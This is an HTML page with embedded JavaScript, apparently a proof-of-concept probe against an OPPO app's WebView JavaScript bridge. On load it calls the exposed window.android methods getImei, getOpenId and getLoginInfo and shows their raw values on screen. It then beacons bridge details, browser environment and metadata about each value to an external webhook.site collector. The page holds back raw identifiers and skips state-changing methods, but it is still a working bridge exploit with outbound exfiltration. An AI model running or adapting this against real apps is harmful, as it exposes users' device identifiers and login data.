<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO WebBridge Full Local Sensitive Probe</title>
  <style>
    body { font-family: sans-serif; padding: 24px; }
    pre { background: #f3f3f3; padding: 16px; white-space: pre-wrap; word-break: break-word; }
    .warn { color: #b00020; font-weight: bold; }
    button { padding: 10px 16px; margin: 8px 0; }
  </style>
</head>
<body>
<h1>OPPO WebBridge Full Local Sensitive Probe</h1>
<p class="warn">
  Full sensitive values are displayed locally on this device only.
  Webhook receives only metadata, not raw IMEI/OpenID/LoginInfo.
</p>
<p id="status">WAITING</p>
<button onclick="runProbe('manual_button')">Run full local sensitive probe again</button>
<pre id="out"></pre>

<script>
(function () {
  const WEBHOOK = "https://webhook.site/0d6bb58d-a021-4aa2-b4d6-2d2ebb72fcdd";

  const READONLY_SENSITIVE_METHODS = [
    "getImei",
    "getOpenId",
    "getLoginInfo",
    "isLogin",
    "getChannelId"
  ];

  const DO_NOT_CALL = [
    "startPay",
    "downloadGameByPackageName",
    "clipboardText",
    "openActivity",
    "openGame",
    "openGameDetailActivity",
    "openGameWithId",
    "openVideoPlayer",
    "openWebView",
    "callNativeApi",
    "callAsyncNativeApi",
    "doStartLogin",
    "cancelDownload",
    "pauseDownload",
    "startDuiBa",
    "statAction",
    "showScreenshotView"
  ];

  function safeString(x) {
    try {
      if (x === undefined) return "undefined";
      if (x === null) return "null";
      if (typeof x === "string") return x;
      if (typeof x === "number" || typeof x === "boolean") return String(x);
      return JSON.stringify(x);
    } catch (e) {
      try { return String(x); } catch (_) { return "[unstringifiable]"; }
    }
  }

  function metadataOnly(v) {
    const s = safeString(v);
    return {
      empty: s.length === 0 || s === "undefined" || s === "null",
      length: s.length,
      typePreview: s === "undefined" || s === "null" ? s : "non-empty-value-not-sent-to-webhook"
    };
  }

  function callReadonlySensitiveMethods() {
    const localResults = [];
    const webhookResults = [];
    const a = window.android;

    if (!a || typeof a !== "object") {
      return {
        localResults: [{ method: "__android_missing__", ok: false, error: "window.android is not object" }],
        webhookResults: [{ method: "__android_missing__", ok: false, error: "window.android is not object" }]
      };
    }

    for (const m of READONLY_SENSITIVE_METHODS) {
      const localItem = {
        method: m,
        exists: false,
        ok: false,
        returnType: null,
        rawReturnValue_LOCAL_ONLY: null,
        error: null
      };

      const webhookItem = {
        method: m,
        exists: false,
        ok: false,
        returnType: null,
        metadataOnly: null,
        rawValueSentToWebhook: false,
        error: null
      };

      try {
        const exists = typeof a[m] === "function";
        localItem.exists = exists;
        webhookItem.exists = exists;

        if (!exists) {
          localItem.error = "missing_or_not_function";
          webhookItem.error = "missing_or_not_function";
        } else {
          const ret = a[m]();

          localItem.ok = true;
          localItem.returnType = typeof ret;
          localItem.rawReturnValue_LOCAL_ONLY = safeString(ret);

          webhookItem.ok = true;
          webhookItem.returnType = typeof ret;
          webhookItem.metadataOnly = metadataOnly(ret);
        }
      } catch (e) {
        const err = String(e && (e.stack || e.message || e));
        localItem.error = err;
        webhookItem.error = err;
      }

      localResults.push(localItem);
      webhookResults.push(webhookItem);
    }

    for (const m of DO_NOT_CALL) {
      const skipped = {
        method: m,
        skipped: true,
        reason: "state_changing_or_high_risk_method_not_called"
      };
      localResults.push(skipped);
      webhookResults.push(skipped);
    }

    return { localResults, webhookResults };
  }

  function describeAndroidObject() {
    const a = window.android;
    if (!a || typeof a !== "object") {
      return { exists: false, type: typeof a };
    }

    let ownKeys = [];
    let functionKeys = [];
    try {
      ownKeys = Object.getOwnPropertyNames(a).slice(0, 120);
      functionKeys = ownKeys.filter(k => {
        try { return typeof a[k] === "function"; } catch (e) { return false; }
      });
    } catch (e) {}

    return {
      exists: true,
      type: typeof a,
      tag: Object.prototype.toString.call(a),
      ownKeys,
      functionKeys
    };
  }

  function sendWebhookMetadata(payload) {
    const json = JSON.stringify(payload);
    const encoded = encodeURIComponent(json);

    try {
      navigator.sendBeacon(
        WEBHOOK + "/sensitive-localonly-metadata-beacon",
        new Blob([json], { type: "application/json" })
      );
    } catch (e) {}

    try {
      fetch(WEBHOOK + "/sensitive-localonly-metadata-post", {
        method: "POST",
        mode: "no-cors",
        headers: { "content-type": "application/json" },
        body: json
      }).catch(function(){});
    } catch (e) {}

    try {
      new Image().src =
        WEBHOOK +
        "/sensitive-localonly-metadata-get?event=SENSITIVE_LOCALONLY_METADATA_RESULT&t=" +
        Date.now() +
        "&d=" +
        encoded.slice(0, 7000);
    } catch (e) {}
  }

  window.runProbe = function(reason) {
    const called = callReadonlySensitiveMethods();

    const localDisplayResult = {
      eventType: "SENSITIVE_FULL_LOCAL_DISPLAY_RESULT",
      version: "full_local_display_v1_no_raw_webhook",
      ts: new Date().toISOString(),
      reason,
      safetyBoundary: {
        rawSensitiveValuesDisplayedOnDevice: true,
        rawSensitiveValuesSentToWebhook: false,
        stateChangingMethodsCalled: false
      },
      location: {
        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        referrer: document.referrer || null
      },
      environment: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        webdriver: navigator.webdriver
      },
      androidBridge: describeAndroidObject(),
      readonlySensitiveMethodResults_LOCAL_SCREEN_ONLY: called.localResults
    };

    const webhookMetadataResult = {
      eventType: "SENSITIVE_LOCALONLY_METADATA_RESULT",
      version: "full_local_display_v1_no_raw_webhook",
      ts: localDisplayResult.ts,
      reason,
      safetyBoundary: {
        rawSensitiveValuesDisplayedOnDevice: true,
        rawSensitiveValuesSentToWebhook: false,
        stateChangingMethodsCalled: false
      },
      location: localDisplayResult.location,
      environment: localDisplayResult.environment,
      androidBridge: localDisplayResult.androidBridge,
      readonlySensitiveMethodResults_METADATA_ONLY: called.webhookResults
    };

    document.getElementById("status").textContent =
      "SENSITIVE_FULL_LOCAL_DISPLAY_DONE: " + localDisplayResult.ts;

    document.getElementById("out").textContent =
      JSON.stringify(localDisplayResult, null, 2);

    sendWebhookMetadata(webhookMetadataResult);
  };

  setTimeout(function () {
    runProbe("auto_after_load_1200ms");
  }, 1200);
})();
</script>
</body>
</html>
